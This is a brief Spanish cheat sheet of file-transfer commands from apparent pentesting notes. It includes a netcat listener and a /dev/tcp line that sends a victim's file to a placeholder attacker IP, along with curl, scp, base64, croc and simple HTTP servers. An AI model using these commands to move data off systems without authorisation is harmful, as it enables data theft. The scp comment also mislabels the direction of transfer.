## Abrir puerto para server:

python3 -m http.server PORT

## Traer archivo:

curl -O http://IP:PORT/archivo

## SCP (enviar archivos a la maquina víctima)

scp USUARIO@IP:/RUTA .

## Con Netcat:

nc -nlvp PORT > archivo (Atacante)

cat ruta_archivo > /dev/tcp/IP_ATACANTE/PORT (Victima)

## Con base64:

base 64 archivo.zip (victima)

echo “texto” | base64 -d > archivo.zip (atacante)

## Croc

croc send RUTA_A_ARCHIVO

## Con php

php -S 0.0.0.0:PORT
